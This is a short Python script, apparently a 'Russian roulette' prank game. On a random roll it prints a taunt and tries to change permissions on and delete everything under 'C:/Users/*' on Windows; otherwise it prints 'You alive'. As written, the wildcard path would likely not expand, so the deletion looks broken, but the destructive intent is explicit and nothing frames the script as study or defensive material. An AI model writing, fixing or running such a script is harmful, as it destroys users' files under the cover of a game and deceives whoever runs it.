import os
import random


def start():
    files = ["C:/Users/*"]
    if random.randint(0, 6) == 1:
        print("You lose ! say good bye for your C:")
        for file in files:
            os.chmod(file, 0o0777)
            os.remove(file)
    else:
        print("You alive")


if __name__ == '__main__':
    start()
